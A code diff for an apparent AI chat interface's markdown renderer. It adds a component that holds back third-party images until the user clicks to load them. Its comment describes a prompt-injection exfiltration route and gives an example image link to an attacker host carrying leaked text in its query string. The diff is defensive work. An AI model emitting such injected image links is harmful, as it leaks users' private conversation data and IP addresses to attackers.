@@ -473,6 +473,102 @@ function TableRow({ children }: { children?: React.ReactNode }) {
 }
 
 /**
+ * Third-party image hosts are not fetched automatically. A document the model
+ * read can carry an injected `![](https://attacker/?q=<leaked text>)`, and an
+ * automatic fetch would both exfiltrate that query string and hand the host the
+ * reader's IP. Same-origin and relative sources are ours, so they load as-is.
+ */
+function isThirdPartyImageSrc(src: string): boolean {
+  if (!src || src.startsWith('#')) return false;
+  if (src.startsWith('/') && !src.startsWith('//')) return false;
+  try {
+    return new URL(src, window.location.href).origin !== window.location.origin;
+  } catch {
+    return false;
+  }
+}
+
+function imageHostLabel(src: string): string {
+  try {
+    return new URL(src, window.location.href).hostname;
+  } catch {
+    return src;
+  }
+}
+
+function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
+  const { t } = useTranslation();
+  const [isAllowed, setIsAllowed] = useState(false);
+  const needsConsent = Boolean(src) && !isAllowed && isThirdPartyImageSrc(src!);
+
+  return (
+    <Box as="span" style={{ margin: 'var(--space-3) 0', textAlign: 'center', display: 'block' }}>
+      {needsConsent ? (
+        <Flex
+          as="span"
+          direction="column"
+          align="center"
+          gap="2"
+          style={{
+            padding: 'var(--space-4)',
+            border: '1px dashed var(--slate-7)',
+            borderRadius: 'var(--radius-2)',
+            backgroundColor: 'var(--slate-2)',
+          }}
+        >
+          <MaterialIcon name="image_not_supported" size={24} color="var(--slate-9)" />
+          <Text size="1" as="span" style={{ color: 'var(--slate-11)' }}>
+            {t('chatStream.remoteImageBlocked')}
+          </Text>
+          <Text size="1" as="span" style={{ color: 'var(--slate-10)', wordBreak: 'break-all' }}>
+            {t('chatStream.remoteImageFrom', { host: imageHostLabel(src!) })}
+          </Text>
+          <button
+            type="button"
+            onClick={() => setIsAllowed(true)}
+            style={{
+              cursor: 'pointer',
+              border: '1px solid var(--slate-7)',
+              borderRadius: 'var(--radius-2)',
+              backgroundColor: 'var(--slate-1)',
+              color: 'var(--accent-11)',
+              padding: 'var(--space-1) var(--space-3)',
+              font: 'inherit',
+              fontSize: 'var(--font-size-1)',
+            }}
+          >
+            {t('chatStream.remoteImageLoad')}
+          </button>
+        </Flex>
+      ) : (
+        <img
+          src={src}
+          alt={alt ?? ''}
+          loading="lazy"
+          referrerPolicy="no-referrer"
+          style={{
+            maxWidth: '100%',
+            height: 'auto',
+            borderRadius: 'var(--radius-2)',
+            border: '1px solid var(--slate-5)',
+            display: 'inline-block',
+          }}
+        />
+      )}
+      {alt && (
+        <Text
+          size="1"
+          as="span"
+          style={{ color: 'var(--slate-10)', marginTop: 'var(--space-1)', fontStyle: 'italic', display: 'block' }}
+        >
+          {alt}
+        </Text>
+      )}
+    </Box>
+  );
+}
+
+/**
  * Fenced code block with a header bar (language label + copy button)
  * and syntax-highlighted body that adapts to light / dark theme.
  */
@@ -1045,29 +1141,7 @@ export function createMarkdownComponents(
       />
     ),
     img: ({ src, alt }: { src?: string; alt?: string }) => (
-      <Box as="span" style={{ margin: 'var(--space-3) 0', textAlign: 'center', display: 'block' }}>
-        <img
-          src={src}
-          alt={alt ?? ''}
-          loading="lazy"
-          style={{
-            maxWidth: '100%',
-            height: 'auto',
-            borderRadius: 'var(--radius-2)',
-            border: '1px solid var(--slate-5)',
-            display: 'inline-block',
-          }}
-        />
-        {alt && (
-          <Text
-            size="1"
-            as="span"
-            style={{ color: 'var(--slate-10)', marginTop: 'var(--space-1)', fontStyle: 'italic', display: 'block' }}
-          >
-            {alt}
-          </Text>
-        )}
-      </Box>
+      <MarkdownImage src={src} alt={alt} />
     ),
     a: ({ href, children }: { href?: string; children?: React.ReactNode }) => (
       <a
